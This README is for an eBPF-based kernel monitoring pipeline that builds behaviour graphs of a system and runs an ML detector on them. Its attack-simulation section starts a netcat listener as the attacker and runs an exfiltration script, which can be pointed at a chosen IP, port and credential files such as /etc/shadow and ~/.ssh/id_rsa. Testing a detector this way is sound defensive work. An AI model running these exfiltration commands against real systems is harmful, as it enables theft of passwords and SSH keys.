# K-Guard Pipeline

An interactive kernel-space runtime monitoring and behavioral visualization pipeline driven by eBPF, `libbpf`, and NetworkX.

## Prerequisites

Install the required system build dependencies and generate the `vmlinux.h` header file from your running kernel:

```bash
sudo apt update
sudo apt install -y clang llvm libbpf-dev libelf-dev build-essential bpftool python3-pip
pip3 install -r requirements.txt

# Generate the kernel definition header
mkdir include && bpftool btf dump file /sys/kernel/btf/vmlinux format c > include/vmlinux.h
```

## Compilation
```
make clean && make
```

## Execution
```
sudo ./monitor | python3 src/user/graphengine.py
```

## Attack Simulation

1. Data Exfiltration 
Start a local TCP listener using netcat. This acts as the attacker terminal, waiting to receive ex data.
```
nc -lnvp 9999
```
Make the script executable and run it against your local listener
```
chmod +x scenario2_exfil.py
python3 script/exfil.py
```
For custom attacker's ip, attacker's port and file, use following command:
```
python3 script/exfil.py --ip <custom_IP> --port <custom_PORT> --file <custom_file (For ex: /etc/shadow, /etc/passwd, ~/.ssh/id_rsa)>
```

## Viewing the live Topology

The engine auto-saves updates to disk every 5 seconds under `output/`. Open the generated interactive
standalone webpage from that directory.

On Linux: 
```
xdg-open output/kguard_interactive_graph.html
```
On macOS:
```
open output/kguard_interactive_graph.html
```


### Full test run (capture → attack → detect)

Run these **sequentially**, each in its own terminal:

```bash
# Terminal 1 — start the capture pipeline
sudo ./monitor | python3 src/user/graphengine.py
```

```bash
# Terminal 2 — start the attacker's listener
nc -lvnp 9999
```

```bash
# Terminal 3 — run the exfiltration simulation
python3 script/exfil.py
```

Wait for `exfil.py` to print `[+] Exfiltration complete.`, then go back to **Terminal 1** and
press `Ctrl+C` to stop the monitor and flush the final graph to
`output/system_behavior_graph.gexf`.

Finally, run the detector:

```bash
python3 -m ml.detector
```